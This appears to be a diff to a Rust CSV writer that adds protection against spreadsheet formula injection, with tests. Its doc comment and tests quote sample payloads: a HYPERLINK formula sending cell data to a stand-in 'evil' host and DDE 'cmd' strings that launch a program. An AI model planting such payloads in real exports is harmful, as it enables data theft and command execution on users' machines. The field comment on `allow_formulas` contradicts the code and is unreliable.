@@ -77,6 +77,9 @@ fn json_cell_to_string(v: Option<&serde_json::Value>) -> String {
 pub struct CsvWriter {
     out: String,
     column_count: Option<usize>,
+    /// When `true` (the default) a value that would be read as a
+    /// spreadsheet formula is neutralised. See [`Self::raw_formulas`].
+    allow_formulas: bool,
 }
 
 impl CsvWriter {
@@ -124,15 +127,68 @@ impl CsvWriter {
         &self.out
     }
 
+    /// Opt out of formula neutralisation and emit values byte-for-byte.
+    ///
+    /// Only for CSV consumed by a machine. Anything a person may open in
+    /// Excel / LibreOffice / Sheets should keep the default — see
+    /// [`neutralize_formula`] for what it guards against.
+    #[must_use]
+    pub fn raw_formulas(mut self) -> Self {
+        self.allow_formulas = true;
+        self
+    }
+
     fn write_row(&mut self, row: &[String]) {
         for (i, field) in row.iter().enumerate() {
             if i > 0 {
                 self.out.push(',');
             }
-            self.out.push_str(&escape_field(field));
+            let field = if self.allow_formulas {
+                escape_field(field)
+            } else {
+                escape_field(&neutralize_formula(field))
+            };
+            self.out.push_str(&field);
         }
         self.out.push_str("\r\n");
     }
+}
+
+/// Defuse a cell that a spreadsheet would evaluate as a formula
+/// (CWE-1236, #1283).
+///
+/// Excel, LibreOffice and Google Sheets treat a leading `=`, `+`, `-`,
+/// `@` — and a leading tab or CR — as the start of a formula, so an
+/// exported value like
+///
+/// ```text
+/// =HYPERLINK("https://evil.example/?d="&A1,"Click for details")
+/// ```
+///
+/// runs on open. RFC 4180 quoting does not help: the quotes are stripped
+/// before the cell is parsed. The fix is to prefix the value with a
+/// single quote, which spreadsheets consume as "this is literal text".
+///
+/// **Numbers are left alone.** A blanket prefix would mangle every
+/// negative number in an export (`-5` → `'-5`), so a field that parses
+/// as a plain number passes through untouched — `-5` and `+3.14` are
+/// data, `-2+cmd|'/c calc'!A0` is not.
+#[must_use]
+pub fn neutralize_formula(s: &str) -> String {
+    let Some(first) = s.chars().next() else {
+        return s.to_owned();
+    };
+    if !matches!(first, '=' | '+' | '-' | '@' | '\t' | '\r') {
+        return s.to_owned();
+    }
+    // A well-formed number is not a formula, whatever it starts with.
+    if s.parse::<f64>().is_ok() {
+        return s.to_owned();
+    }
+    let mut out = String::with_capacity(s.len() + 1);
+    out.push('\'');
+    out.push_str(s);
+    out
 }
 
 /// Escape one CSV field per RFC 4180.
@@ -223,6 +279,76 @@ mod tests {
         w.headers(&["a", "b"]);
         w.row(&["1", "2", "3", "4"]); // long
         assert_eq!(w.into_string(), "a,b\r\n1,2\r\n");
+    }
+
+    // ---- #1283 formula injection ----
+
+    #[test]
+    fn leading_formula_triggers_are_neutralised() {
+        // The classic: an exfiltrating hyperlink in a user-set field.
+        assert_eq!(
+            neutralize_formula(r#"=HYPERLINK("http://evil/?"&A1,"x")"#),
+            r#"'=HYPERLINK("http://evil/?"&A1,"x")"#
+        );
+        assert_eq!(neutralize_formula("+SUM(A1)"), "'+SUM(A1)");
+        assert_eq!(neutralize_formula("@SUM(A1)"), "'@SUM(A1)");
+        assert_eq!(
+            neutralize_formula("-2+3+cmd|' /c calc'!A0"),
+            "'-2+3+cmd|' /c calc'!A0"
+        );
+        // Leading tab / CR are formula lead-ins in Excel too.
+        assert_eq!(neutralize_formula("\t=1+1"), "'\t=1+1");
+        assert_eq!(neutralize_formula("\r=1+1"), "'\r=1+1");
+    }
+
+    #[test]
+    fn numbers_are_not_mangled() {
+        // A blanket prefix would wreck every negative number in an
+        // export. These are data, not formulas.
+        for n in ["-5", "-5.25", "+3.14", "0", "1e6", "-1e-6"] {
+            assert_eq!(neutralize_formula(n), n, "{n} must pass through");
+        }
+    }
+
+    #[test]
+    fn ordinary_text_is_untouched() {
+        for s in ["", "plain", "a,b", "hello world", "user@example.com"] {
+            assert_eq!(neutralize_formula(s), s);
+        }
+    }
+
+    #[test]
+    fn writer_neutralises_by_default_and_still_quotes() {
+        let mut w = CsvWriter::new();
+        w.headers(["name"]);
+        w.row(["=1+1"]);
+        // Prefixed, and the leading quote does not itself force quoting.
+        assert_eq!(w.as_str(), "name\r\n'=1+1\r\n");
+
+        // A formula containing a comma still gets RFC 4180 quoting on
+        // top of the prefix.
+        let mut w = CsvWriter::new();
+        w.row(["=A1,B1"]);
+        assert_eq!(w.as_str(), "\"'=A1,B1\"\r\n");
+    }
+
+    #[test]
+    fn raw_formulas_opt_out_emits_verbatim() {
+        let mut w = CsvWriter::new().raw_formulas();
+        w.row(["=1+1"]);
+        assert_eq!(w.as_str(), "=1+1\r\n");
+    }
+
+    #[test]
+    fn json_export_helper_is_protected_by_default() {
+        // The shape csv_response.rs documents: user-controlled fields
+        // dumped for an operator to open.
+        let rows = vec![serde_json::json!({ "name": "=cmd|' /c calc'!A0" })];
+        let out = csv_from_json_rows(&["name"], &rows).into_string();
+        assert!(
+            out.contains("'=cmd"),
+            "exported user data must be neutralised: {out}"
+        );
     }
 
     #[test]
